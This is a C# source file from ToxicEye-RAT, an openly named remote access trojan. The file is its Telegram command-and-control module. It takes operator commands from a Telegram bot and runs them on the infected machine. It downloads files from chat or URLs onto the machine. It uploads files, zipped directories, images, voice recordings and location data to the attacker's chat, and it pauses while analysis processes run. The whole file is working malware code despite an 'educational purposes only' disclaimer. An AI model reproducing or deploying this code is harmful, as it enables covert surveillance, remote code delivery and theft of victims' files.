/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading;
using SimpleJSON;

namespace TelegramRAT
{
    internal class telegram
    {
        // Thread
        public static Thread waitCommandsThread = new Thread(waitCommands);
        // Thread is blocked
        public static bool waitThreadIsBlocked = false;
     

        // If is blocked - wait
        private static void waitForUnblock()
        {
            while (true)
            {
                // If detected bad process
                if (waitThreadIsBlocked)
                {
                    Thread.Sleep(200);
                    continue;
                } else
                {
                    break;
                }
            }
        }


        // Wait commands
        private static void waitCommands()
        {
            waitForUnblock();
            // Get last update id
            int LastUpdateID = 0;
            string response;
            using (WebClient client = new WebClient())
                response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates");
            LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;

            // Get commands
            while (true)
            {
                // Sleep
                Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
                //
                waitForUnblock();
                // Get commands
                LastUpdateID++;
                using (WebClient client = new WebClient())
                    response = client.DownloadString($"https://api.telegram.org/bot{config.TelegramToken}/getUpdates?offset={LastUpdateID}");
                var json = JSON.Parse(response);

                foreach (JSONNode r in json["result"].AsArray)
                {
                    JSONNode message = r["message"];
                    string chatid = message["chat"]["id"];
                    LastUpdateID = r["update_id"].AsInt;

                    // If not the creator of the bot writes
                    if (chatid != config.TelegramChatID)
                    {
                        string username = message["chat"]["username"];
                        string firstname = message["chat"]["first_name"];
                        sendText($"👑 You not my owner {firstname}", chatid);
                        sendText($"👑 Unknown user with id {chatid} and username @{username} send command to bot!");
                        break;
                    }
                    // Download file from chat to computer
                    if (message.HasKey("document"))
                    {
                        // Get document info
                        string fileName = message["document"]["file_name"];
                        string fileID = message["document"]["file_id"];
                        JSONNode filePath;
                        // Get file path
                        using (WebClient client = new WebClient())
                        {
                            filePath = JSON.Parse(client.DownloadString(
                                "https://api.telegram.org/bot" +
                                config.TelegramToken +
                                "/getFile" +
                                "?file_id=" + fileID
                            ))["result"]["file_path"];
                        }
                        // Download
                        DownloadFile(fileName, filePath);
                    }
                    // Run command
                    else if (message.HasKey("text"))
                    {
                        string command = message["text"];
                        // Check if it's command
                        if (!command.StartsWith("/")) { continue; }
                        // Execute command in new thread
                        Thread t = new Thread(() => commands.handle(command));
                        t.SetApartmentState(ApartmentState.STA);
                        t.Start();
                    }
                    else
                    {
                        sendText("🍩 Unknown type received. Only Text/Document can be used!");
                    }
                }
            }
        }

        public static void sendFile(string file, string type = "Document")
        {
            waitForUnblock();
            // If is file
            if (!File.Exists(file))
            {
                sendText("⛔ File not found!");
                return;
            }
            // Send file
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent fform = new MultipartFormDataContent();
                var file_bytes = File.ReadAllBytes(file);
                fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
                var rresponse = httpClient.PostAsync(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/send" + type +
                    "?chat_id=" + config.TelegramChatID,
                    fform
                );
                rresponse.Wait();
                httpClient.Dispose();
            }
        }

        // Send text
        public static void sendText(string text, string chatID = config.TelegramChatID)
        {
            waitForUnblock();
            using (WebClient client = new WebClient())
            {
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/sendMessage" +
                    "?chat_id=" + chatID +
                    "&text=" + text
                );
            }
        }

        // Send image
        public static void sendImage(string file)
        {
            sendFile(file, "Photo");
        }

        // Send voice
        public static void sendVoice(string file)
        {
            sendFile(file, "Voice");
        }

        // Send location
        public static void sendLocation(float lat, float lon)
        {
            waitForUnblock();
            using (WebClient client = new WebClient())
            {
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    config.TelegramToken +
                    "/sendLocation" +
                    "?chat_id=" + config.TelegramChatID +
                    "&latitude=" + lat +
                    "&longitude=" + lon
                );
            } 
        }
        // Send file from chat/url to computer
        public static void DownloadFile(string file, string path = "")
        {
            waitForUnblock();
            // Download file from url
            if (file.StartsWith("http"))
            {
                sendText($"📄 Downloading file \"{Path.GetFileName(file)}\" from url");
                try
                {
                    using (WebClient client = new WebClient())
                        client.DownloadFile(new Uri(file), Path.GetFileName(file));
                } catch
                {
                    sendText(String.Format("💥 Connection error"));
                    return;
                }
                
                sendText($"💾 File \"{file}\" saved in: \"{Path.GetFullPath(Path.GetFileName(file))}\"");
            // Download file from chat
            } else
            {
                sendText("📄 Downloading file: \"{file}\"");
                path = @"https://api.telegram.org/file/bot" + config.TelegramToken + "/" + path;
                using (WebClient client = new WebClient())
                    client.DownloadFile(new Uri(path), file);
                sendText("💾 File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
            }   
        }

        // Send file from computer to chat
        public static void UploadFile(string file, bool removeAfterUpload = false)
        {
            waitForUnblock();
            // If is file
            if (File.Exists(file))
            {
                sendText("📃 Uploading file...");
                sendFile(file);
                // Remove after uploading
                if(removeAfterUpload)
                {
                    File.Delete(file);
                }
            }
            // If is directory
            else if(Directory.Exists(file))
            {
                sendText("📁 Uploading directory...");
                string zfile = file + ".zip";
                if(File.Exists(zfile))
                { File.Delete(zfile); }
                // Add dir to archive
                System.IO.Compression.ZipFile.CreateFromDirectory(file, zfile);
                // Send archive
                sendFile(zfile);
                // Delete archive
                File.Delete(zfile);
            // If path not exists
            }
            else
            {
                sendText("⛔ File not found!");
                return;
            }   
        }
        
        // Send connected
        public static void sendConnection()
        {
            sendText("🍀 Bot connected");
        }

        
    }
}
